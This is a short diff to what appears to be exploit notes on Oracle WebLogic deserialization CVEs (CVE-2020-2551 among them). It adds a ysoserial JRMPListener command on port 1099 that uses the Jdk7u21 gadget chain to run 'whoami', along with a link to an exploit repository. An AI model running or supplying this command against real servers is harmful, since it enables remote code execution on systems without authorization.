@@ -9,6 +9,9 @@ CVE_2020_2546 CVE-2020-2915 CVE-2020-2801  CVE-2020-2798  CVE-2020-2883 CVE-2020
 - T3 + send jta + ssrf
 
 #### rmi server,see
+- don't use org.mozilla.classfile.DefiningClassLoader
+- don't use java -cp $mtx/../tools/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 'whoami'
+more see:
 https://github.com/hktalent/CVE-2020-2551
 
 ### code n1
